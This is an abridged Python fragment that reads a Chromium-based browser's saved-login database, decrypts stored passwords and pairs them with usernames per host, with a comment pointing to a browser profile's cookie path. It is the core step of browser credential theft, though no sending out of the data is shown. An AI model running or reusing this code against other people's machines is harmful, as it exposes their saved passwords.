...
sql = """
SELECT
    origin_url, username_value, password_value, signon_realm as value
FROM
    logins
"""
host_sql = """
...
# AppData\Local\DcBrowser\User Data\Default\Cookies
...
class ChromeCookieJar(cookiejar.FileCookieJar):
    ...
    def _really_load(self, f, filename, ignore_discard, ignore_expires):
        ...
        for host in hosts:
            uk = {}
            c_str = ""
            cur.execute(sql+"WHERE origin_url LIKE \"" + host +"\"")
            for row in cur:
                username_value = row["username_value"]
                origin_url = row["origin_url"]
                password_value = chrome_decrypt(row['password_value'])
                uk.setdefault(username_value,password_value)
            for k,v in uk.items():
                c_str += k+"="+v+"; "
            print(origin_url)
